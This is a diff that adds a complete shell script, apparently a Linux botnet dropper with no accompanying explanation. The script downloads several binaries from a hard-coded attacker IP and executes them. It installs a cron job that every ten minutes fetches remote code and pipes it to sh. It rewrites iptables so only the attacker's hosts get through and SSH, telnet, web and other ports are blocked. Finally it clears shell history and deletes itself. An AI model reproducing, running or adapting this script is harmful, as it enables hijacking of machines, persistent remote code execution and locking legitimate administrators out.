@@ -1,1 +1,42 @@
+#!/bin/sh
+u="vfGbS"
+bin_names="1TcNQ UpFxv DyvFO weKyA jyGAP vbzIb 08qcq ZBNMp"
+http_server="178.128.151.67"
+http_port=80
 
+for name in $bin_names
+    do
+    rm -rf $u
+    cp $SHELL $u
+    chmod 777 $u
+    >$u
+    wget http://$http_server:$http_port/czbdLGdMZtEyFlGqVPGn/$name -O -> $u
+    ./$u 0dayLoaded
+done
+
+echo '*/10 * * * * wget http://vbyphnnymdjnsiau.3utilities.com/Bj2yso0 -O-|sh' | crontab -
+
+iptables -F
+iptables -t raw -F
+iptables -t mangle -F
+iptables -t mangle -I PREROUTING 1 -p tcp -s 178.128.151.67 -j ACCEPT
+iptables -t mangle -I PREROUTING 2 -p tcp -s sidhgbruqginlafw.zapto.org -j ACCEPT
+iptables -t mangle -I PREROUTING 3 -p tcp -s 104.248.59.173 -j ACCEPT
+iptables -t mangle -I PREROUTING 4 -p tcp -s vbyphnnymdjnsiau.3utilities.com -j ACCEPT
+iptables -t mangle -I PREROUTING 5 -p tcp --destination-port 8088 -j DROP
+iptables -t mangle -I PREROUTING 6 -p tcp --destination-port 22 -j DROP
+iptables -t mangle -I PREROUTING 7 -p tcp --destination-port 23 -j DROP
+iptables -t mangle -I PREROUTING 8 -p tcp --destination-port 80 -j DROP
+iptables -t mangle -I PREROUTING 9 -p tcp --destination-port 443 -j DROP
+iptables -t mangle -I PREROUTING 10 -p tcp --destination-port 8080 -j DROP
+iptables -t mangle -I PREROUTING 11 -p tcp --destination-port 9000 -j DROP
+iptables -t mangle -I PREROUTING 12 -p tcp --destination-port 8089 -j DROP
+iptables -t mangle -I PREROUTING 13 -p tcp --destination-port 7070 -j DROP
+iptables -t mangle -I PREROUTING 14 -p tcp --destination-port 8081 -j DROP
+iptables -t mangle -I PREROUTING 15 -p tcp --destination-port 9090 -j DROP
+iptables -t mangle -I PREROUTING 16 -p tcp --destination-port 161 -j DROP
+iptables -t mangle -I PREROUTING 17 -p tcp --destination-port 19888 -j DROP
+
+rm -rf $u
+history -c
+rm -rf $0
